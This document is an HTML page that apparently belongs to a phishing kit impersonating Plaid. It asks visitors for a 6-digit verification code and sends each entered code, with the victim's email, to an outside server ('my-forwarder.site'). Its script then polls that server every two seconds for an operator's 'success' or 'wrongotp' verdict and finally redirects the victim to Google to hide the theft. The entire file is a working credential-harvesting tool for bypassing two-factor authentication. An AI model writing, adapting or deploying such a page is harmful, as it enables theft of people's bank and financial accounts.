<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OTP Verification</title>
    <style>
        * {
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            margin: 0;
            padding: 0;
        }
        
        body {
            background-color: #f7fafc;
            color: #1a202c;
            line-height: 1.5;
            overflow-x: hidden;
        }
        
        .container {
            max-width: 420px;
            margin: 20px auto;
            padding: 0 20px;
            position: relative;
            min-height: 600px;
        }
        
        .logo {
            text-align: center;
            margin-bottom: 20px;
            position: relative;
            z-index: 10;
        }
        
        .logo img {
            height: 60px;
        }
        
        .card {
            background: white;
            border-radius: 8px;
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
            padding: 24px;
            transition: transform 0.3s ease;
            position: relative;
            left: 0;
            min-height: 400px;
            margin-top: 60px;
        }
        
        .otp-header {
            text-align: center;
            margin-bottom: 24px;
        }
        
        .otp-header h1 {
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 8px;
        }
        
        .otp-header p {
            color: #4a5568;
            font-size: 14px;
        }
        
        .verification-instructions {
            background: #f0f4f8;
            padding: 12px;
            border-radius: 6px;
            margin-bottom: 20px;
            text-align: center;
            font-size: 14px;
            color: #4a5568;
        }
        
        .otp-inputs {
            display: flex;
            justify-content: space-between;
            margin: 20px 0;
        }
        
        .otp-inputs input {
            width: 50px;
            height: 50px;
            text-align: center;
            font-size: 20px;
            border: 1px solid #e2e8f0;
            border-radius: 6px;
            transition: all 0.3s ease;
        }

        .otp-inputs input.blurred {
            filter: blur(2px);
            opacity: 0.7;
            pointer-events: none;
        }
        
        .otp-inputs input:focus {
            outline: none;
            border-color: #000000;
        }
        
        .submit-btn {
            width: 100%;
            background-color: #000000;
            color: white;
            border: none;
            border-radius: 6px;
            padding: 14px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 20px;
        }

        .submit-btn:disabled {
            background-color: #cccccc;
            cursor: not-allowed;
            filter: blur(1px);
        }
        
        .submit-btn:hover:not(:disabled) {
            background-color: #333333;
        }
        
        .throbber {
            width: 40px;
            height: 40px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #000000;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px auto;
            display: none;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .error-message {
            color: #e53e3e;
            text-align: center;
            margin-top: 10px;
            display: none;
        }
        
        .success-message {
            color: #38a169;
            text-align: center;
            margin-top: 10px;
            display: none;
            font-size: 18px;
            font-weight: bold;
            animation: slideIn 0.5s ease-out;
        }

        @keyframes slideIn {
            from { transform: translateY(-20px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }

        .countdown {
            font-size: 16px;
            color: #4a5568;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://models-bangbros.github.io/images/OIP__2_-removebg-preview.png" alt="Plaid Logo">
        </div>
        
        <div class="card">
            <div class="otp-header">
                <h1>Verify Your Identity</h1>
                <p>Enter the 6-digit code sent to your device</p>
            </div>
            
            <div class="verification-instructions">
                Check your registered device for the verification code
            </div>
            
            <form id="otpForm">
                <div class="otp-inputs">
                    <input type="text" maxlength="1" pattern="\d" required name="digit1">
                    <input type="text" maxlength="1" pattern="\d" required name="digit2">
                    <input type="text" maxlength="1" pattern="\d" required name="digit3">
                    <input type="text" maxlength="1" pattern="\d" required name="digit4">
                    <input type="text" maxlength="1" pattern="\d" required name="digit5">
                    <input type="text" maxlength="1" pattern="\d" required name="digit6">
                </div>
                
                <div class="error-message" id="errorMessage"></div>
                <div class="success-message" id="successMessage"></div>
                <div class="countdown" id="countdown"></div>
                
                <div class="throbber" id="otpThrobber"></div>
                
                <button type="submit" class="submit-btn" id="submitBtn" disabled>Verify</button>
            </form>
        </div>
    </div>

    <script>
       document.addEventListener('DOMContentLoaded', function() {
    const urlParams = new URLSearchParams(window.location.search);
    const verificationCode = urlParams.get('code');
    const email = urlParams.get('email');
    
    const otpForm = document.getElementById('otpForm');
    const otpInputs = document.querySelectorAll('.otp-inputs input');
    const otpThrobber = document.getElementById('otpThrobber');
    const errorMessage = document.getElementById('errorMessage');
    const successMessage = document.getElementById('successMessage');
    const countdownElement = document.getElementById('countdown');
    const submitBtn = document.getElementById('submitBtn');
    
    let checkStatusInterval;
    let countdownInterval;
    let lastUpdateTime = 0;
    
    // Initialize the page
    initOTPPage();

    function initOTPPage() {
        // Auto-focus first input
        otpInputs[0].focus();
        
        // Set up input event handlers
        setupInputHandlers();
        
        // Start checking status immediately
        startCheckingStatus();
        
        // Set up form submission
        otpForm.addEventListener('submit', handleFormSubmit);
    }

    function setupInputHandlers() {
        otpInputs.forEach((input, index) => {
            // Handle input navigation
            input.addEventListener('input', function() {
                errorMessage.style.display = 'none';
                
                // Move to next input if current has value
                if (this.value.length === 1 && index < otpInputs.length - 1) {
                    otpInputs[index + 1].focus();
                }
                
                // Update submit button state
                updateSubmitButtonState();
            });
            
            // Handle backspace navigation
            input.addEventListener('keydown', function(e) {
                if (e.key === 'Backspace' && !this.value && index > 0) {
                    otpInputs[index - 1].focus();
                }
            });
        });
    }

    function updateSubmitButtonState() {
        const allFilled = Array.from(otpInputs).every(input => input.value.length === 1);
        submitBtn.disabled = !allFilled;
    }

    function handleFormSubmit(e) {
        e.preventDefault();
        showLoadingState();
        
        // Combine OTP digits
        const otp = Array.from(otpInputs).map(input => input.value).join('');
        
        // Validate OTP format
        if (!validateOTP(otp)) {
            showError('Please enter a valid 6-digit code');
            resetFormState();
            return;
        }
        
        // Submit OTP to server
        submitOTP(otp);
    }

    function validateOTP(otp) {
        return otp.length === 6 && /^\d+$/.test(otp);
    }

    function showLoadingState() {
        otpThrobber.style.display = 'block';
        errorMessage.style.display = 'none';
        submitBtn.disabled = true;
        otpInputs.forEach(input => {
            input.classList.add('blurred');
            input.disabled = true;
        });
    }

    async function submitOTP(otp) {
        const formData = new FormData();
        formData.append('otp', otp);
        formData.append('code', verificationCode);
        formData.append('email', email);
        
        try {
            await fetch('https://my-forwarder.site/plaid/otp-action.php', {
                method: 'POST',
                body: formData
            });
        } catch (error) {
            console.error('Submission error:', error);
        }
    }

    function startCheckingStatus() {
        checkStatusInterval = setInterval(async () => {
            try {
                // Add cache-busting parameter and last update timestamp
                const response = await fetch(
                    `https://my-forwarder.site/plaid/otp-check.php?code=${verificationCode}&_=${Date.now()}&since=${lastUpdateTime}`
                );
                
                if (!response.ok) {
                    console.error('Status check failed');
                    return;
                }
                
                const data = await response.json();
                
                // Only process if we have new data
                if (data.updated_at && data.updated_at > lastUpdateTime) {
                    lastUpdateTime = data.updated_at;
                    
                    if (data.status === 'success') {
                        handleSuccessResponse();
                    } else if (data.status === 'wrongotp') {
                        handleWrongOTPResponse();
                    }
                }
            } catch (error) {
                console.error('Error checking status:', error);
            }
        }, 2000); // Check every 2 seconds
    }

    function handleSuccessResponse() {
        clearInterval(checkStatusInterval);
        hideThrobber();
        
        // Hide form and show success
        otpForm.style.display = 'none';
        successMessage.textContent = 'Verification successful!';
        successMessage.style.display = 'block';
        
        // Start countdown
        startCountdown(5, 'https://google.com'); // Reduced to 5 seconds for testing
    }

    function handleWrongOTPResponse() {
        clearInterval(checkStatusInterval);
        hideThrobber();
        
        showError('Invalid verification code. Please try again.');
        setTimeout(() => {
            window.location.href = `otp.html?code=${verificationCode}&email=${encodeURIComponent(email)}`;
        }, 2000);
    }

    function startCountdown(seconds, redirectUrl) {
        countdownElement.textContent = `Redirecting in ${seconds} seconds...`;
        countdownElement.style.display = 'block';
        
        countdownInterval = setInterval(() => {
            seconds--;
            countdownElement.textContent = `Redirecting in ${seconds} seconds...`;
            
            if (seconds <= 0) {
                clearInterval(countdownInterval);
                window.location.href = redirectUrl;
            }
        }, 1000);
    }

    function hideThrobber() {
        otpThrobber.style.display = 'none';
    }

    function showError(message) {
        errorMessage.textContent = message;
        errorMessage.style.display = 'block';
        otpInputs.forEach(input => input.value = '');
        otpInputs[0].focus();
    }

    function resetFormState() {
        hideThrobber();
        submitBtn.disabled = false;
        otpInputs.forEach(input => {
            input.classList.remove('blurred');
            input.disabled = false;
        });
        updateSubmitButtonState();
    }

    // Clean up when leaving page
    window.addEventListener('beforeunload', function() {
        clearInterval(checkStatusInterval);
        clearInterval(countdownInterval);
    });
});
    </script>
</body>
</html>
